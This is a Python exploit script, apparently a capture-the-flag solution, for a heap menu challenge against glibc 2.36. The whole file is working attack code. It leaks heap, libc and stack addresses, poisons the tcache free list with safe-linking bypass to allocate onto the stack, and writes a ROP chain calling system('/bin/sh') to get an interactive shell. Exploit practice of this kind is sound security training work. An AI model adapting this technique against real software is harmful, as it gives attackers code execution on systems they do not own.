#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("./libc-2.36.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"-----Resize----\n")
    sl(i2b(choice))


def add(idx, size):
    cmd(1)
    ru(b"Where? ")
    sl(i2b(idx))
    ru(b"size? ")
    sl(i2b(size))


def delet(idx):
    cmd(2)
    ru(b"Where? ")
    sl(i2b(idx))


def show(idx):
    cmd(3)
    ru(b"Where? ")
    sl(i2b(idx))


def edit(idx, data):
    cmd(4)
    ru(b"Where? ")
    sl(i2b(idx))
    s(data)


add(0, 0x200)
add(1, 0x200)
add(2, 0x200)
add(3, 0x200)
add(5, 0x520)
add(4, 0x200)
delet(0)
delet(1)
show(0)
heap_key = u64_ex(rn(5))
lg("heap_key", heap_key)
heap_base = heap_key << 12
lg("heap_base", heap_base)

delet(5)
show(5)
libc_base = u64_ex(rn(6)) - 0x1D1CC0
lg("libc_base", libc_base)

delet(2)
delet(3)

edit(3, p64((libc_base + libc.sym.environ) ^ heap_key))
add(6, 0x200)
add(7, 0x200)
show(7)
stack_base = u64_ex(rn(6)) - 0x158 - 0x10
lg("stack_base", stack_base)

add(8, 0x120)
add(9, 0x120)
add(10, 0x120)
add(11, 0x120)
delet(9)
delet(11)
delet(8)
delet(10)

edit(10, p64((stack_base) ^ heap_key))
add(12, 0x120)
add(13, 0x120)
pop_rdi_ret = libc_base + 0x000000000002AA82

edit(
    13,
    p64(0) * 3
    + p64(pop_rdi_ret)
    + p64(libc_base + next(libc.search(b"/bin/sh\x00")))
    + p64(libc_base + libc.sym.system),
)

ia()
